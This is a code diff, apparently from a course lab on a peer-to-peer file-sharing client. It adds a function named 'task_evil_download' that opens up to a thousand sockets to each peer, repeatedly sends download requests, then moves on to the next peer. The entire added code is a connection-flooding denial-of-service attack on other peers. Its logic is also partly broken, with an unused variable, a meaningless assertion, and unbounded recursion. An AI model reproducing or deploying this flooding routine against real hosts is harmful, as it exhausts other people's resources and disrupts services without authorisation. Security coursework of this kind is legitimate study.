@@ -595,6 +595,51 @@ static void task_download(task_t *t, task_t *tracker_task)
 	task_download(t, tracker_task);
 }
 
+static void task_evil_download(task_t *t, task_t *tracker_task){
+	int noPeers = !t || !t->peer_list;
+	int t_type = t->type == TASK_DOWNLOAD;
+	int tr_type = tracker_task->type == TASK_TRACKER;
+	assert(t_type && (t_type || !t));
+	if (noPeers) {
+		error("* No peers for '%s'\n", (t ? t->filename : "that file"));
+		task_free(t);
+		return;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr && t->peer_list->port == listen_port)
+	goto repeat;
+
+	message("* Connecting to %s:%d to fake download'%s\n", inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Connection failed to peer: %s\n", strerror(errno));
+		goto repeat;
+	}
+
+	int overflow[1000];
+	unsigned int index;
+	for (index = 0; index < 1000; index++){
+		overflow[index] = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (overflow[index] == -1){
+			error("* Connection failed to peer: %s\n", strerror(errno)); 
+			goto repeat;	
+		}
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	}
+	
+	while (1) {
+		int result = read_to_taskbuf(t->peer_fd, t);
+		if (result == TBUF_ERROR) {
+			error("* Reading error");
+			goto repeat;
+		}
+		break;
+	}
+	
+	repeat:
+	if (t->disk_filename[0])
+		unlink(t->disk_filename);
+	task_pop_peer(t);
+	task_evil_download(t, tracker_task);
+}       
 
 // task_listen(listen_task)
 //	Accepts a connection from some other peer.
